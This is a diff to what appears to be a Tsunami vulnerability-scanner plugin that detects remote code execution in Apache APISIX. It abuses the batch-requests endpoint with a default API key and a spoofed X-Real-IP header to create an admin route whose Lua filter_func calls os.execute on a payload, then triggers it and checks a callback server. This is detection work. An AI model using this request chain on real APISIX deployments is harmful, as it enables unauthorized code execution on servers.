@@ -39,7 +39,7 @@ finding: {
 ###########
 
 actions: {
-  name: "register_route"
+  name: "register_and_execute_route"
   http_request: {
     method: POST
     uri: "/apisix/batch-requests"
@@ -56,6 +56,10 @@ actions: {
       '      "path": "/apisix/admin/routes/tsunami_rce?ttl=30",'
       '      "method": "PUT",'
       '      "body": "{\\"uri\\":\\"/tsunami_rce/{{ T_UTL_CURRENT_TIMESTAMP_MS }}\\",\\"upstream\\":{\\"type\\":\\"roundrobin\\",\\"nodes\\":{}},\\"name\\":\\"{{ T_UTL_CURRENT_TIMESTAMP_MS }}\\",\\"filter_func\\":\\"{{ PIPE_REQ_FILTER_FUNC }}\\"}"'
+      '    },'
+      '    {'
+      '      "path": "/apisix/admin/routes/tsunami_rce?ttl=30",'
+      '      "method": "GET"'
       '    }'
       '  ]'
       '}'
@@ -70,28 +74,35 @@ actions: {
   cleanup_actions: "cleanup_route"
 }
 
-actions: {
-  name: "execute_route"
-  http_request: {
-    method: GET
-    uri: "/tsunami_rce/{{ T_UTL_CURRENT_TIMESTAMP_MS }}"
-    headers: [
-      { name: "X-API-KEY" value: "{{ DEFAULT_API_KEY }}" }
-    ]
-  }
-}
+# the cleanup action also exploits the batch requests endpoint
 
 actions: {
   name: "cleanup_route"
   http_request: {
-    method: DELETE
-    uri: "/apisix/admin/routes/tsunami_rce"
+    method: POST
+    uri: "/apisix/batch-requests"
+    data: 
+      '{'
+      '  "headers": {'
+      '    "X-Real-IP": "{{ X_REAL_IP }}",'
+      '    "X-API-KEY": "{{ DEFAULT_API_KEY }}",'
+      '    "Content-Type": "application/json"'
+      '  },'
+      '  "timeout": 1500,'
+      '  "pipeline": ['
+      '    {'
+      '      "path": "/apisix/admin/routes/tsunami_rce",'
+      '      "method": "DELETE"'
+      '    }'
+      '  ]'
+      '}'
     response: {
       http_status: 200
+      expect_any: {
+        conditions: { body {} contains: '"status":200' },
+        conditions: { body {} contains: '"status":201' }
+      }
     }
-    headers: [
-      { name: "X-API-KEY" value: "{{ DEFAULT_API_KEY }}" }
-    ]
   }
 }
 
@@ -117,9 +128,7 @@ workflows: {
     { name: "PIPE_REQ_FILTER_FUNC" value: "function(vars) os.execute('{{ PAYLOAD }}'); return true end" }
   ]
   actions: [
-    "register_route",
-    "sleep",
-    "execute_route",
+    "register_and_execute_route",
     "sleep",
     "check_callback_server_logs"
   ]
